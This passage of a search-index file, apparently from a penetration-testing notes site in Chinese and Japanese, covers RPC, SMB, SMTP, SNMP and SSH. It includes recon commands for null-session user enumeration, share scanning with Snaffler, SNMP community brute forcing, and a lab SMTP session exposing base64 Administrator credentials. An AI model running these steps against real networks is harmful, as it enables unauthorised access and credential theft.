NetBIOS over IEEE 802.2 and IPX/SPX using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols, respectively. In modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name. NetBIOS is also used for identifying system names in TCP/IP(Windows). Simply saying, it is a protocol that allows communication of files and printers through the Session Layer of the OSI Model in a LAN.</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6"]},{"location":"Resources/Network/Protocol/RPC/","title":"RPC","text":"","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/RPC/#_1","title":"\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528","text":"<ul> <li>RPC\u662f\u4e00\u79cd\u7279\u5b9a\u7c7b\u578b\u7684IPC\uff08\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff0cInterprocess Communication\uff09\u6280\u672f\u3002\u53ef\u5b9e\u73b0\u5206\u5e03\u5f0f\u7cfb\u7edf\u3002</li> <li>\u5b58\u6839\uff08Stub\uff09\u662f\u4e00\u79cd\u7528\u4e8e\u5b9e\u73b0RPC\u7684\u5173\u952e\u7ec4\u4ef6\u3002\u5b58\u6839\u5145\u5f53\u672c\u5730\u8fdb\u7a0b\u548c\u8fdc\u7a0b\u8fdb\u7a0b\u4e4b\u95f4\u7684\u4ee3\u7406\uff0c\u5b83\u4eec\u5206\u522b\u5b58\u5728\u4e8e\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u7aef\u3002</li> <li>\u901a\u8fc7\u4f7f\u7528\u5b58\u6839\uff0cRPC \u53ef\u4ee5\u5c06\u672c\u5730\u8fc7\u7a0b\u8c03\u7528\uff08\u51fd\u6570\u8c03\u7528\uff09\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u8fdb\u884c\u900f\u660e\u7684\u901a\u4fe1\uff0c\u4f7f\u5f97\u5ba2\u6237\u7aef\u80fd\u591f\u50cf\u8c03\u7528\u672c\u5730\u51fd\u6570\u4e00\u6837\u8c03\u7528\u8fdc\u7a0b\u8fc7\u7a0b\uff0c\u800c\u4e0d\u5fc5\u5173\u5fc3\u901a\u4fe1\u7ec6\u8282\u548c\u7f51\u7edc\u4f20\u8f93\u3002\u5b58\u6839\u7684\u5b58\u5728\u7b80\u5316\u4e86\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u5b9e\u73b0\uff0c\u4f7f\u5f97\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u7684\u8fdb\u7a0b\u80fd\u591f\u8fdb\u884c\u4e92\u76f8\u4e4b\u95f4\u7684\u901a\u4fe1\u3002</li> </ul>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/RPC/#how-rpc-works","title":"How RPC Works","text":"<p>https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738291(v=ws.10)?redirectedfrom=MSDN</p> <p>\u57fa\u672c\u4e0aRPC\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a</p> <ol> <li>\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u90fd\u6709\u76f8\u540c\u7684\u51fd\u6570\u63a5\u53e3\u7684\u58f0\u660e\uff0c\u5305\u62ec\u51fd\u6570\u540d\u79f0\u3001\u53c2\u6570\u5217\u8868\u548c\u8fd4\u56de\u503c\u7c7b\u578b\u3002</li> <li>\u5f53\u5ba2\u6237\u7aef\u60f3\u8fdb\u884cRPC\u65f6\uff0c\u901a\u8fc7\u5ba2\u6237\u7aef\u5b58\u6839\uff08Client Stub\uff09\u8fd9\u4e2a\u672c\u5730\u4ee3\u7406\uff0c\u5b83\u77e5\u9053\u5982\u4f55\u5c06\u672c\u5730\u51fd\u6570\u8c03\u7528\u8f6c\u6362\u4e3a\u7f51\u7edc\u6d88\u606f\uff0c\u5e76\u5c06\u6d88\u606f\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002\u5ba2\u6237\u7aef\u5b58\u6839\u4f1a\u5728\u6d88\u606f\u4e2d\u5305\u542b\u51fd\u6570\u7684\u6807\u8bc6\u7b26\uff08IFID\uff09\u3001\u53c2\u6570\u548c\u5176\u4ed6\u76f8\u5173\u4fe1\u606f\u3002</li> <li>\u800c\u670d\u52a1\u5668\u5b58\u6839\u63a5\u6536\u3001\u89e3\u6790\u8bf7\u6c42\uff0c\u627e\u5230\u5bf9\u5e94IFID\u548c\u53c2\u6570\uff0c\u7136\u540e\u8c03\u7528\u670d\u52a1\u5668\u4e0a\u7684\u5bf9\u5e94\u51fd\u6570\uff0c\u5c06\u8fd0\u884c\u7ed3\u679c\u8fd4\u56de\u3002</li> </ol>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/RPC/#ifidinterface-identifier","title":"IFID\uff1a\"Interface Identifier\"\uff08\u63a5\u53e3\u6807\u8bc6\u7b26\uff09","text":"<ul> <li>\u53ef\u7528rpcdump\u679a\u4e3eIFID</li> <li>\u8457\u540dIFID\uff1a https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc#notable-rpc-interfaces</li> </ul>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/RPC/#4rpc-locator-service","title":"4\u79cd\u534f\u8bae\u5e8f\u5217\u8bbf\u95eeRPC locator service","text":"<ul> <li>ncacn_ip_tcp and ncadg_ip_udp (TCP and UDP port 135)</li> <li>ncacn_np (the \\pipe\\epmapper named pipe via SMB)</li> <li>ncacn_http (RPC over HTTP via TCP port 80, 593, and others)</li> </ul> <p>\u534f\u8bae\u5e8f\u5217\uff1a\u7528\u4e8e\u6807\u8bc6\u548c\u6307\u5b9a RPC \u901a\u4fe1\u4f7f\u7528\u7684\u5e95\u5c42\u4f20\u8f93\u534f\u8bae\u7684\u6807\u8bb0\u3002\uff08protocol\u6307\u62bd\u8c61\u7684\u901a\u4fe1\u534f\u8bae\uff09</p>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/RPC/#ncacnnetwork-computing-architecture-connection-network","title":"ncacn\uff1aNetwork Computing Architecture Connection Network","text":"<ul> <li>Network Computing Architecture\uff08\u7f51\u7edc\u8ba1\u7b97\u67b6\u6784\uff0c\u7b80\u79f0NCA\uff09\u662f\u7531 Open Software Foundation\uff08OSF\uff09\u5f00\u53d1\u7684\u4e00\u79cd\u5206\u5e03\u5f0f\u8ba1\u7b97\u67b6\u6784\u3002\u5728 NCA \u4e2d\uff0cRPC \u662f\u4e00\u79cd\u901a\u4fe1\u6a21\u5f0f\uff0c\u5141\u8bb8\u5728\u5206\u5e03\u5f0f\u8ba1\u7b97\u73af\u5883\u4e2d\u7684\u4e0d\u540c\u8fdb\u7a0b\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\uff0c\u4f7f\u5f97\u5b83\u4eec\u53ef\u4ee5\u50cf\u8c03\u7528\u672c\u5730\u8fc7\u7a0b\u4e00\u6837\u8c03\u7528\u8fdc\u7a0b\u8fc7\u7a0b\u3002</li> <li>\u5728 Microsoft Windows \u4e2d\uff0c\"ncacn\" \u524d\u7f00\u88ab\u7528\u4e8e\u6307\u5b9a\u4f7f\u7528\u54ea\u79cd\u7f51\u7edc\u534f\u8bae\u6765\u5b9e\u73b0 RPC \u901a\u4fe1\u3002</li> </ul>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/RPC/#comdcom","title":"COM/DCOM","text":"<p>Microsoft\u2019s foundational COM and DCOM technologies are built on top of RPC. The service\u2019s name is RpcSs and it runs inside the shared services host process, svchost.exe. This is one of the main processes in any Windows operating system &amp; it should not be terminated.</p> <p>DCOM\uff1aDistributed Component Object Model\u3002 https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN</p> <p>\u4e0e DCOM \u7684\u4ea4\u4e92\u662f\u901a\u8fc7 TCP \u7aef\u53e3 135 \u4e0a\u7684 RPC \u6267\u884c\u7684\uff0c\u5e76\u4e14\u9700\u8981\u672c\u5730\u7ba1\u7406\u5458\u8bbf\u95ee\u6743\u9650\u624d\u80fd\u8c03\u7528 DCOM \u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\uff08\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a API\uff09\u3002</p> <p>\u5229\u7528\u6761\u4ef6\uff1a\u672c\u5730\u7ba1\u7406\u5458</p> <p>\u5404\u79cd\u6a2a\u5411\u5229\u7528\uff1a https://www.cybereason.com/blog/dcom-lateral-movement-techniques</p>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/RPC/#_2","title":"\u5de5\u5177","text":"","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/RPC/#rpcclient","title":"RPCclient","text":"<p><code>rpcclient -U \"\" &lt;ip&gt;</code></p> <p>\u8fdb\u5165\u4e4b\u540e\u7684\u547d\u4ee4\uff1a <pre><code>srvinfo\nenumdomusers\nenumalsgroups domain|builtin\nlookupnames &lt;user or group name&gt;\n</code></pre></p>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/SMB/","title":"SMB","text":"<p>https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb</p> <p>[!note] microsoft-ds: Direct-hosting SMB</p>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51"]},{"location":"Resources/Network/Protocol/SMB/#_1","title":"\u7ea2\u961f\u4f8b","text":"<p><code>smbmap --no-write-check -u &lt;user&gt; -d &lt;domain&gt; -p [pass] -H &lt;IP&gt; -P 445 -q</code></p> <ul> <li>Snaffler \u306f\u30d5\u30a1\u30a4\u30eb\u30b3\u30f3\u30c6\u30f3\u30c4\u306b\u5bfe\u3057\u3066\u30d1\u30bf\u30fc\u30f3\u30de\u30c3\u30c1\u3092\u2f8f\u3044\u3001\u653b\u6483\u306b\u6709\u2f64\u306a\u60c5\u5831\u3092\u767a\u2f92\u3059\u308b\u305f\u3081\u306e\u30c4\u30fc\u30eb\u3067\u3042\u308b\u3002\u4ee5\u4e0b\u306b\u3001Snaffler \u5b9f\u2f8f\u6642\u306e\u30b3\u30de\u30f3\u30c9\u3068\u5b9f\u2f8f\u7d50\u679c\u306e\u4f8b\u3092\u2f70\u3059\u3002<code>bofnet_executeassembly Snaffler -s n [IP \u30a2\u30c9\u30ec\u30b9]</code></li> </ul>","tags":["\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","IT/\u7f51\u7edc","\u6e17\u900f/\u5185\u7f51"]},{"location":"Resources/Network/Protocol/SMTP/","title":"SMTP","text":"<p>\u5ba2\u6237\u7aef\u7528SMTP\u5c06\u90ae\u4ef6\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/SMTP/#smtp","title":"SMTP\u547d\u4ee4","text":"<p>[!NOTE] \u8fde\u63a5SMTP\u670d\u52a1\u5668\uff1a\u53ef\u7528telnet\u6216nc\u8fde\u63a525\u3001587\u7aef\u53e3\u3002 - <code>telnet</code> \u5ba2\u6237\u7aef\u628a\u6240\u6709\u952e\u76d8\u8f93\u5165\uff0c\u5305\u62ec\u63a7\u5236\u5b57\u7b26\uff0c\u90fd\u5f53\u4f5c\u4f1a\u8bdd\u6570\u636e\u53d1\u9001\u7ed9\u8fdc\u7aef\u670d\u52a1\u5668\uff0c\u800c\u4e0d\u662f\u5728\u672c\u5730\u5904\u7406\u2014\u2014\u65ad\u5f00\u8fde\u63a5\u7528 <code>QUIT</code> \u547d\u4ee4\u3002</p> <ul> <li>587\u7aef\u53e3\uff1a\u88ab\u5b9a\u4e49\u4e3a\u90ae\u4ef6\u63d0\u4ea4\u7aef\u53e3\uff08MSA\uff0cMail Submission Agent\uff09\uff0c\u4e13\u95e8\u7528\u4e8e\u5ba2\u6237\u7aef\u5411\u90ae\u4ef6\u670d\u52a1\u5668\u63d0\u4ea4\u90ae\u4ef6\u3002\u8fd9\u662fIETF\uff08\u4e92\u8054\u7f51\u5de5\u7a0b\u4efb\u52a1\u7ec4\uff09\u63a8\u8350\u7684\u6807\u51c6\u505a\u6cd5\uff08\u8be6\u89c1RFC 6409\uff09\u3002\u7aef\u53e3587\u6bd425\u591a\u4e86<code>STARTTLS</code>\u529f\u80fd\u3002</li> <li>25\u7aef\u53e3\uff1a\u867d\u7136\u4ecd\u7136\u662f\u6807\u51c6\u7684SMTP\u4f20\u8f93\u7aef\u53e3\uff0c\u4f46\u4e3b\u8981\u7528\u4e8e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u4e0d\u63a8\u8350\u7528\u4e8e\u5ba2\u6237\u7aef\u63d0\u4ea4\u90ae\u4ef6\u3002</li> </ul> <ul> <li>\u5728\u4f7f\u7528 <code>MAIL FROM</code> \u548c <code>RCPT TO</code> \u547d\u4ee4\u65f6\uff0c\u9700\u8981\u7528\u5c16\u62ec\u53f7 <code>&lt;&gt;</code> \u62ec\u4f4f\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002\u8fd9\u662fSMTP\u534f\u8bae\u7684\u89c4\u8303\u505a\u6cd5\uff0c\u786e\u4fdd\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u88ab\u6b63\u786e\u89e3\u6790\u3002</li> </ul> <p>EHLO\u662fHELO\u7684\u6269\u5c55\uff0c\u6240\u4ee5\u80fd\u6709\u66f4\u591a\u547d\u4ee4\u3002\u5982\u8ba4\u8bc1\u3002 \u8ba4\u8bc1\u4fe1\u606f\u9700\u8981\u7528base64\u7f16\u7801\u3002 <pre><code>\u2514\u2500$ telnet 10.10.11.14 25 \nTrying 10.10.11.14...\nConnected to 10.10.11.14.\nEscape character is '^]'.\n220 mailing.htb ESMTP\nEHLO mailing.htb\n250-mailing.htb\n250-SIZE 20480000\n250-AUTH LOGIN PLAIN\n250 HELP\nAUTH LOGIN\n334 VXNlcm5hbWU6\nQWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==\n334 UGFzc3dvcmQ6\naG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y\n235 authenticated.\nMAIL FROM:&lt;Administrator@mailing.htb&gt;           \n250 OK\nRCPT TO:&lt;maya@mailing.htb&gt;\n</code></pre></p> <p> - \u6ce8\u610f\uff1a\u4e0a\u9762\u8bf4\u7684email address\u90fd\u662f\u6307\u4fe1\u5c01\u7684\u3002\u800c\u4fe1\u7684\u5185\u5bb9\u662fDATA\uff0c\u4e14\u672c\u8eab\u4fe1\u4ef6\u7684\u62ac\u5934\u548c\u7f72\u540d\u4e5f\u7b97\u662f\u4fe1\u4ef6\u7684\u5185\u5bb9\u3002 - \u4f46\u4e00\u822c\uff0cFrom\u548cTo\u662f\u8bbe\u7f6e\u5230MUA\u4e2d\u7684\u3002 </p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/SMTP/#_1","title":"\u679a\u4e3e\u7528\u6237","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/SMTP/#_2","title":"\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","text":"<p> - EXPN - shows the actual delivery addresses of aliases and mailing lists</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/SMTP/#_3","title":"\u679a\u4e3e\u5de5\u5177","text":"<ul> <li>NetScanTools Pro\uff1aSMTP Email Generator\uff0c\u53ef\u901a\u8fc7SMTP\u670d\u52a1\u5668\u6d4b\u8bd5Email\u53d1\u9001</li> <li>smtp-user-enum \uff1a\u901a\u8fc7SMTP\u670d\u52a1\uff08sendmail\uff09\uff0c\u679a\u4e3eSolaris\u7684OS level\u7684\u8d26\u6237</li> <li>Telnet</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/SNMP/","title":"SNMP","text":"<p>161/UDP</p> <p></p> <p>In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it.  Encryption and authentication were only added in SNMP version 3.</p> <p>[!NOTE] Community\uff08\u4e0d\u662f\u5bc6\u7801\uff09\u4f3c\u4e4e\u662f\u76f8\u5f53\u4e8e\u57df\u7684\u4e1c\u897f\uff0c\u5728\u8fd9\u4e2a\u57df\u8303\u56f4\u5185\u5171\u4eab\u4fe1\u606f \u9ed8\u8ba4\u503c\uff1a - public\uff1aread\u7528 - private\uff1a\u8bfb\u5199\u7528</p> <p></p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","\u6e17\u900f/CPTS","\u6e17\u900f/CEH"]},{"location":"Resources/Network/Protocol/SNMP/#_1","title":"\u5de5\u5177","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","\u6e17\u900f/CPTS","\u6e17\u900f/CEH"]},{"location":"Resources/Network/Protocol/SNMP/#snmpwalk","title":"snmpwalk","text":"<p><pre><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0\n</code></pre> - \u8fd9\u91cc\u7684<code>public</code>\u5373Community</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","\u6e17\u900f/CPTS","\u6e17\u900f/CEH"]},{"location":"Resources/Network/Protocol/SNMP/#onesixtyone","title":"onesixtyone","text":"<pre><code>onesixtyone -c dict.txt 10.129.42.254\n</code></pre>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","\u6e17\u900f/CPTS","\u6e17\u900f/CEH"]},{"location":"Resources/Network/Protocol/SNMP/#mib","title":"MIB","text":"<p>IBM\u77e5\u8bc6\u4e2d\u5fc3\uff1a https://www.ibm.com/docs/en/aix/7.3?topic=management-information-base</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","\u6e17\u900f/CPTS","\u6e17\u900f/CEH"]},{"location":"Resources/Network/Protocol/SNMP/#mib_1","title":"MIB\u7c7b\u522b","text":"<ul> <li>DHCP.MIB\uff1a\u76d1\u63a7DHCP\u670d\u52a1\u5668\u548c\u8fdc\u7a0b\u4e3b\u673a\u4e4b\u95f4\u7684\u7f51\u7edc\u6d41\u91cf</li> <li>HOSTMIB.MIB\uff1a\u5b58\u50a8\u6709\u5173\u7ba1\u7406\u548c\u76d1\u89c6\u8d44\u6e90\u7684\u4fe1\u606f</li> <li>LMMIB2.MIB\uff1a\u5b58\u50a8\u5de5\u4f5c\u7ad9\u548c\u670d\u52a1\u5668\u670d\u52a1\u6570\u636e</li> <li>MIB_II.MIB\uff1a\u5b58\u50a8\u6709\u5173\u4e3b\u673a\u4e0a TCP/IP \u7684\u4fe1\u606f</li> <li>WINS.MIB\uff1a\u5bf9\u4e8e Windows Internet \u540d\u79f0\u670d\u52a1 (WINS)</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","\u6e17\u900f/CPTS","\u6e17\u900f/CEH"]},{"location":"Resources/Network/Protocol/SNMP/#_2","title":"\u53c2\u8003","text":"<p>https://milestone-of-se.nesuke.com/sv-basic/system-monitoring/snmp-summary/</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f/\u4fe1\u606f\u6536\u96c6","\u6e17\u900f/CPTS","\u6e17\u900f/CEH"]},{"location":"Resources/Network/Protocol/SSH/","title":"SSH","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#know_hostsauthorized_keys","title":"know_hosts\u548cauthorized_keys","text":"<ul> <li>know_hosts: \u81ea\u5df1\u767b\u5f55\u8fc7\u7684\u4e3b\u673a\u3002</li> <li>authorized_keys: \u5141\u8bb8\u767b\u5f55\u81ea\u5df1\u7684\u4e3b\u673a\uff0c\u5176\u4e2d\u52a0\u5165\u8bb8\u53ef\u7684\u516c\u94a5\u2014\u2014SSH#\u5bc6\u94a5\u767b\u9646</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_1","title":"\u8fde\u63a5\u6d41\u7a0b","text":"","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_2","title":"\u4e00\u822c","text":"<ol> <li>\u6211\u7684\u673a\u5668\uff08\u672c\u673a\uff09\u8fde\u63a5SRV</li> <li>\u672c\u673a\u8df3\u63d0\u9192\u2014\u2014\u4e0d\u8ba4\u8bc6\u8fd9\u4e2aSRV\u7684\u6307\u7eb9\uff08\u516c\u94a5\u7684\u54c8\u5e0c\uff09\uff0c\u662f\u5426\u8fde\u63a5</li> <li>\u6240\u6709\u8fde\u63a5\u8fc7\u7684\u516c\u94a5\u6307\u7eb9\u90fd\u5b58\u5728\u672c\u673a\u7684 <code>~/.ssh/know_hosts</code> \u6587\u4ef6<ul> <li>\u76ee\u6807\u516c\u94a5\u548c\u672c\u673a\u5b58\u6863\u4e0d\u5339\u914d\u7684\u60c5\u51b5\u4e0b\u4f1a\u8df3\u8b66\u544a\u3002</li> </ul> </li> </ol>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_3","title":"\u5bc6\u94a5\u767b\u9646","text":"<ol> <li>\u522b\u4eba\u8fde\u6211\uff0c\u8bf7\u6c42ssh\u767b\u5f55</li> <li>\u6211\u770b <code>authorized_keys</code> \u6587\u4ef6\u91cc\u6709\u6ca1\u6709\u4ed6\u7684\u516c\u94a5\uff0c\u6709\u5c31\u7528\u4ed6\u7684\u516c\u94a5\u52a0\u5bc6\u968f\u673a\u6570\u53e3\u4ee4\u53d1\u56de\u53bb</li> <li>\u522b\u4eba\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u89e3\u5bc6</li> <li>SRV\u516c\u94a5\u89e3\u5bc6\u5bf9\u6bd4\u2014\u2014\u5b8c\u6210\u9a8c\u8bc1</li> </ol>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_4","title":"\u8bc1\u4e66\u767b\u9646","text":"<p>SSH#\u9996\u5148\u9700\u8981\u751f\u6210\u8bc1\u4e66\uff1a</p> <p>\u6d41\u7a0b\uff1a</p> <ol> <li>\u7528\u6237\u8bf7\u6c42\u767b\u5f55SRV\uff0cssh\u81ea\u52a8\u628a\u7528\u6237\u8bc1\u4e66\u53d1\u7ed9SRV</li> <li>SRV\u68c0\u67e5\u8bc1\u4e66&amp;\u662f\u5426\u7531\u53ef\u4fe1\u7684CA\u9881\u53d1</li> <li>\u6ca1\u95ee\u9898\u7684\u8bddssh\u81ea\u52a8\u628aSRV\u8bc1\u4e66\u7ed9\u7528\u6237</li> <li>\u7528\u6237\u68c0\u67e5</li> <li>\u53cc\u65b9\u5efa\u7acb\u8fde\u63a5\uff0cSRV\u5141\u8bb8\u7528\u6237\u767b\u5f55</li> </ol>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_5","title":"\u914d\u7f6e\u5bc6\u94a5\u767b\u9646","text":"<p>\u514d\u5bc6\u7801\u8f93\u5165</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_6","title":"\u751f\u6210\u5bc6\u94a5","text":"<p>\u5ba2\u6237\u7aef\u7528<code>ssh-keygen</code>\u751f\u6210\u81ea\u5df1\u7684\u5bc6\u94a5\u5bf9\uff1a<code>ssh-keygen [-t rsa -b 2048 -f keypair]</code></p> <ul> <li>-t\uff1a\u9ed8\u8ba4rsa\u3002<ul> <li>rsa\uff1a\u975e\u5bf9\u79f0\uff0c\u80fd\u52a0/\u89e3\u5bc6\u7b7e\u540d</li> <li>dsa\uff1a\u5bf9\u79f0\uff0c\u53ea\u80fd\u7528\u6765\u7b7e\u540d</li> </ul> </li> <li>-b\uff1a\u5bc6\u94a5\u957f\u5ea6\uff08bits\uff09\u3002\u5982RSA\u7b97\u6cd5\u5c31\u662f\u5176\u6a21\u6570\uff08n\uff09\u7684\u957f\u5ea6\u3002</li> <li>-f\uff1a\u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\uff08\u79c1\u94a5\uff09\u540d\uff0c\u516c\u94a5\u4e3a\u6dfb\u52a0<code>.pub</code>\u540e\u7f00\u3002</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_7","title":"\u914d\u7f6e\u4f7f\u7528","text":"<p>\u5c06\u5ba2\u6237\u7aef\u7684\u516c\u94a5\u653e\u5165\u8fdc\u7a0bSRV\u7684\u6307\u5b9a\u4f4d\u7f6e\uff08<code>~/.ssh/authorized_keys</code>\uff09</p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_8","title":"\u624b\u52a8","text":"<p><code>$ cat ~/.ssh/id_rsa.pub | ssh user@host \"mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys\"</code></p>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_9","title":"\u81ea\u52a8","text":"<p><code>$ ssh-copy-id -i pubkey_file user@host</code></p> <ul> <li>\u4f1a\u63d0\u793a\u8f93\u5165\u76ee\u6807host\u7684\u5bc6\u7801</li> <li>\u6ce8\u610f\uff1a\u76ee\u6807host\u7684<code>authorized_keys</code>\u9700\u8981\u4ee5\u6362\u884c\u7b26\u7ed3\u5c3e\u3002\u56e0\u4e3a\u8be5\u547d\u4ee4\u76f4\u63a5\u5c06\u516c\u94a5\u6dfb\u52a0\u5230\u76ee\u6807host\u7684<code>authorized_keys</code>\u6587\u4ef6\u7684\u672b\u5c3e\uff0c\u5982\u679c\u8be5\u6587\u4ef6\u672c\u8eab\u4e0d\u662f\u4ee5\u6362\u884c\u7b26\u7ed3\u5c3e\uff0c\u5c06\u5bfc\u81f4\u683c\u5f0f\u9519\u8bef\u800c\u914d\u7f6e\u65e0\u6548\u3002</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_10","title":"\u914d\u7f6e\u8bc1\u4e66\u767b\u9646","text":"<p>\u8bc1\u4e66\u5373\u516c\u94a5\u8bc1\u4e66</p> <p>https://www.ruanyifeng.com/blog/2020/07/ssh-certificate.html</p> <p>\u5bc6\u94a5\u767b\u9646\u7684\u7f3a\u70b9\uff1a\u670d\u52a1\u7aef\u9700\u8981\u4fdd\u5b58\u7528\u6237\u516c\u94a5\uff0c\u5ba2\u6237\u7aef\u4e5f\u8981\u4fdd\u5b58\u670d\u52a1\u7aef\u516c\u94a5\u6307\u7eb9\u3002\u5bf9\u4e8e\u5927\u578b\u7ec4\u7ec7\u6765\u8bf4\u4e0d\u4fbf\u7ba1\u7406\uff0c\u5982\u5458\u5de5\u79bb\u804c\u540e\u8fd8\u9700\u8981\u5c06\u5176\u516c\u94a5\u4ece\u6bcf\u53f0\u670d\u52a1\u5668\u4e2d\u5220\u9664\u3002 \u8bc1\u4e66\u767b\u9646\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002  </p> <p>\u5f15\u5165CA\uff0c\u5bf9\u4fe1\u4efb\u7684\u670d\u52a1\u5668\u9881\u53d1\u670d\u52a1\u5668\u8bc1\u4e66\uff0c\u5bf9\u4fe1\u4efb\u7684\u7528\u6237\u9881\u53d1\u7528\u6237\u8bc1\u4e66\u3002 \u767b\u5f55\u65f6\uff0c\u7528\u6237\u548c\u670d\u52a1\u5668\u4e0d\u9700\u8981\u63d0\u524d\u77e5\u9053\u5f7c\u6b64\u7684\u516c\u94a5\uff0c\u53ea\u9700\u4ea4\u6362\u5404\u81ea\u7684\u8bc1\u4e66\uff0c\u9a8c\u8bc1\u662f\u5426\u53ef\u4fe1\u5373\u53ef\u3002</p> <p>\u4e3b\u8981\u4f18\u70b9\uff1a</p> <ul> <li>\u53cc\u65b9\u4e0d\u7528\u4ea4\u6362\u516c\u94a5</li> <li>\u8bc1\u4e66\u53ef\u914d\u7f6e\u6709\u6548\u671f\uff0c\u800c\u516c\u94a5\u4e0d\u884c</li> </ul>","tags":["IT/\u7f51\u7edc","\u6e17\u900f"]},{"location":"Resources/Network/Protocol/SSH/#_11","title":"\u9996\u5148\u9700\u8981\u751f\u6210\u8bc1\u4e66","text":"<ol> <li>\u7528\u6237\u548cSRV\u90fd\u5c06\u81ea\u5df1\u7684\u516c\u94a5\u7ed9CA\uff08CA\u672c\u8d28\u4e0a\u662f\u4e00\u5bf9\u5bc6\u94a5\uff0cCA\u5c31\u7528\u8fd9\u5bf9\u5bc6\u94a5\u53bb\u7b7e\u53d1\u8bc1\u4e66\u3002\u5b9e\u9645\u4e0a\u6709\u5206SRV\u7528/\u7528\u6237\u7528\uff09</li> 